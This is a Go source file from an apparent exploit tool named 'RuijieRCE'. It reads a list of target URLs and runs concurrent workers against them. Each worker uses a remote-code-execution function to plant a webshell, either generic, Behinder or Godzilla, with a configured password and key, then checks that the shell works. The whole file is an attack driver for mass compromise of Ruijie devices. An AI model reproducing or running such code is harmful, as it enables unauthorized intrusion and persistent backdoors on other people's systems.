package task

import (
	"RuijieRCE/funcs"
	"RuijieRCE/vars"
	"sync"
)

func Concurrent()  {
	url := funcs.GetFileUrl(vars.FILE)
	wg := &sync.WaitGroup{}
	wg.Add(vars.ThreadNum)
	taskChan := make(chan string, vars.ThreadNum)
	shellcode := shell()

	for i := 0; i < vars.ThreadNum; i++ {
		go scan(taskChan, wg, shellcode)
	}

	for _, target := range url{
		taskChan <-target
	}
	close(taskChan)
	wg.Wait()
}

func shell() string {
	name, pass, key := funcs.Config()
	var shellcode string
	switch  {
	case name == "":
		shellcode = funcs.ShellCode(pass, key)

	case name == "B":
		shellcode = funcs.Behinder(pass)

	case name == "G":
		shellcode = funcs.Godzilla(pass, key)
	}
	return shellcode
}

func scan(taskChan chan string, wg *sync.WaitGroup, shellcode string)  {
	defer wg.Done()
	for  {
		task, ok := <- taskChan
		if !ok {
			return
		}
		target, shellname := funcs.Url(task)
		url, err := funcs.Rce(target, shellname, shellcode, vars.Header)
		if err != nil || url == ""{
			continue
		}
		go func() {
			wg.Add(1)
			funcs.Judge(url, "", vars.Header)
			wg.Done()
		}()
	}
}